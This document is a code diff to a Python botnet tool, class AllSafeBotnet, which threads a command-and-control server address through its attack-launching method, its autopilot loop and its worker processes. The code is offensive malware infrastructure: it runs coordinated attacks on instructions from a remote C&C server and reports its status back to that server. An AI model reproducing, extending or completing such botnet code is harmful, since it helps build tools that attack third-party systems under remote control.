@@ -32,14 +32,15 @@ class AllSafeBotnet():
         self._botnet_instance = None
 
 
-    def attack(self, configuration, override=False):
+    def attack(self, configuration, override=False, ccserver=None):
         """
         Method to start a new attack session.
         @param: configuration, string - path to the configuration file
         @param: override, boolean - whenever to override the configuration file
+        @param ccserver, string - default None, C&C server remote address
         @return: a tuple (identification, attack_statistics_dictionary, attack_counter)
         """
-        self._botnet_instance = self.Botnet(configuration, self._botnet_queue, override)
+        self._botnet_instance = self.Botnet(configuration, self._botnet_queue, override, ccserver)
 
         botnet = self._botnet_instance
         botnet.start()
@@ -74,7 +75,7 @@ class AllSafeBotnet():
         while True:
             # override mode -> local configuration!
             if override:
-                self.attack(configuration, override=True)
+                self.attack(configuration, override=True, ccserver=server)
             # periodically check for C&C to carry a coordinated attack
             else:
                 up = logCCUpdate(server, self._botnet_identity, "autopilot mode... attack " + str(self._attack_counter) + "executing")
@@ -92,14 +93,15 @@ class AllSafeBotnet():
 
 
     class Botnet(Process):
-        def __init__(self, configuration, queue, override=False, name='AllSafeBotnetInstance'):
+        def __init__(self, configuration, queue, override=False, ccserver=None, name='AllSafeBotnetInstance'):
             super().__init__(name=name)
             self._queue          = queue
             self._configuration  = configuration
             self._override_conf  = override
+            self._ccserver       = ccserver
             # initialize master
             try:
-                self._allsafe_master = AllSafeWorkerMaster(self._configuration, override=self._override_conf)
+                self._allsafe_master = AllSafeWorkerMaster(self._configuration, override=self._override_conf, ccserver = self._ccserver)
             except Exception:
                 raise Exception("Error in Botnet initialization!")
 
